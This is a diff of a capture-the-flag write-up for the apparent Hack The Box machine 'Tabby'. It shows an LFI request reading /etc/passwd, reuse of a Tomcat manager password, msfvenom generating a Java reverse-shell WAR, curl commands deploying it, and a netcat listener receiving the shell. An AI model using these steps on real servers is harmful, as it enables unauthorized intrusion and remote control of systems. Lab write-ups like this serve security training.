@@ -1,4 +1,4 @@
-# Optimum
+# Tabby
 ## Reconnaissance
 
 * Performed TCP and UDP scans using Nmap.
@@ -116,7 +116,7 @@ Not Vulnerable to CVE-2017-12617
 ```
 
 
-* LFI discovered
+* LFI discovered on for http://10.10.10.194
 * Access http://10.10.10.194/news.php?file=../../../../../../etc/passwd
 ```
 
@@ -297,7 +297,80 @@ binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc rw,nosuid,nodev,noexec,relatime
 ```
 ![image](https://raw.githubusercontent.com/kookiecrack/images/main/tomcat-pw-tabby.png)
 
-* Successfully obtained the credentials to tomcat.
+* Successfully obtained the credentials to tomcat. user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script". Logged in to tomcat host-manager
+* Tried the same credentials for SSH
 
+```
+kali@kali:~/HTB/tabby$ ssh root@10.10.10.194
+The authenticity of host '10.10.10.194 (10.10.10.194)' can't be established.
+ECDSA key fingerprint is SHA256:fMuIFpNbN9YiPCAj+b/iV5XPt9gNRdvR5x/Iro2HrKo.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.194' (ECDSA) to the list of known hosts.
+root@10.10.10.194: Permission denied (publickey).
+kali@kali:~/HTB/tabby$ ssh tomcat@10.10.10.194
+tomcat@10.10.10.194: Permission denied (publickey).
+```
+## Weaponization
+* Create war file using msfvenom for upload to tomcat
+```
+kali@kali:~/HTB/tabby$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.12 LPORT=443 -f war -o reverse443.warPayload size: 13398 bytes
+Final size of war file: 13398 bytes
+Saved as: reverse443.war
+```
+## Delivery & Exploitation
+* Deploy A New Application Archive (WAR) [Remotely](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)
+*  Curl Commands: -u, --user <user:password> Server user and password,-T, --upload-file <file> Transfer local FILE to destination
 
+```
+kali@kali:~/HTB/tabby$ curl -u 'tomcat':'$3cureP4s5w0rd123!' -T reverse443.war 'http://10.10.10.194:8080/manager/text/deploy?path=/reverse443'
+OK - Deployed application at context path [/reverse443]
+kali@kali:~/HTB/tabby$ curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/examples:running:0:/usr/share/tomcat9-examples/examples
+/host-manager:running:4:/usr/share/tomcat9-admin/host-manager
+/reverse443:running:0:reverse443
+/manager:running:0:/usr/share/tomcat9-admin/manager
+/docs:running:0:/usr/share/tomcat9-docs/docs
+kali@kali:~/HTB/tabby$ curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/reverse443
+```
+* Webshell obtained
+```
+kali@kali:~/HTB/tabby$ sudo nc -nvlp 443
+[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [10.10.14.12] from (UNKNOWN) [10.10.10.194] 55380
+whoami
+tomcat
+ifconfig
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.194  netmask 255.255.255.0  broadcast 10.10.10.255
+        ether 00:50:56:b9:d7:53  txqueuelen 1000  (Ethernet)
+        RX packets 780  bytes 179064 (179.0 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 541  bytes 520732 (520.7 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 9944  bytes 706488 (706.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 9944  bytes 706488 (706.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+        
+which python3
+/usr/bin/python3
+python3 -c 'import pty;pty.spawn("/bin/sh")'
+$ pwd
+pwd
+/var/lib/tomcat9
+$ cd /
+cd /
+$ cd home
+cd home
+$ ls -la ash
+ls -la ash
+ls: cannot open directory 'ash': Permission denied
+```
 
